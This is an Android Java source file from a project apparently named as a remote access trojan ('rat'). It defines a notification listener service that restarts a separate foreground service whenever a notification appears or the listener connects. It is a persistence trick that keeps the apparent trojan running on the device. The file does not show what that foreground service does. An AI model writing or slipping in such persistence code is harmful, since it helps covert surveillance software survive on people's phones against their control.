package com.fly0rakoon.rat.services;

import android.content.Intent;
import android.os.Build;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

public class NotificationService extends NotificationListenerService {
    private static final String TAG = "NotificationService";
    
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        Log.d(TAG, "Notification posted: " + sbn.getPackageName());
        
        // Every time a notification appears, ensure our service is running
        ensureServiceRunning();
    }
    
    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Can also check service here
    }
    
    @Override
    public void onListenerConnected() {
        Log.d(TAG, "Notification listener connected");
        ensureServiceRunning();
    }
    
    private void ensureServiceRunning() {
        try {
            Intent serviceIntent = new Intent(this, ForegroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            Log.d(TAG, "Service check performed from notification listener");
        } catch (Exception e) {
            Log.e(TAG, "Failed to ensure service: " + e.getMessage());
        }
    }
}
